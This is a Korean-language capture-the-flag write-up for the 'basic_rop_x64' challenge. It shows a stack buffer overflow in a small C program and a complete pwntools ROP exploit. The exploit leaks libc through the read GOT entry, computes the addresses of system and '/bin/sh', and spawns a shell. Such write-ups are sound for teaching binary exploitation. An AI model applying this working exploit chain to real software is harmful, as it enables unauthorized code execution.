basic_rop_x64 라이트업
=================

## 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

buf 변수의 크기는 0x40이지만 read 함수에서 buf 변수에 0x400 크기의 입력을 받고 있어 버퍼 오버플로우가 발생한다.

### 버퍼 오버플로우

* buf 변수의 크기는 0x40이지만 read 함수에서 buf 변수에 0x400 크기의 입력을 받고 있어 버퍼 오버플로우가 발생한다.
* buf가 할당된 64바이트 뒤에는 8바이트의 sfp와 8바이트의 ret이 위치한다.
* 'A'를 72바이트만큼 입력해서 buf, sfp를 더미 값으로 덮고 ret을 원하는 값으로 설정해서 바이너리의 실행 흐름을 조작할 수 있다.


## 익스플로잇 분석


### system 함수 주소 계산

* ASLR이 걸려있기 때문에 system 함수의 주소는 계속 변하게 되지만 Base 주소 + system 함수의 오프셋을 통해 system 함수의 주소를 구할 수 있다.
* read 함수의 주소 - read 함수의 오프셋을 하면 Base 주소를 구할 수 있다.
* read 함수가 실행된 이후 read 함수의 주소는 GOT에 등록되어 있기 때문에 read 함수의 GOT 값을 읽으면 read 함수의 주소를 구할 수 있다.

------------

### "bin/sh" 문자열

* system("bin/sh") 를 실행하기 위해서는 "bin/sh" 문자열이 필요하다.
* system 함수와 동리하게 Base 주소 + "bin/sh" 문자열 오프셋으로 주소를 구해야 한다.



## 익스플로잇 코드


```python
from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64", checksec=False)
r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload:bytes = b'A' * 0x48

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

payload: bytes = b'A' * 0x48

payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```
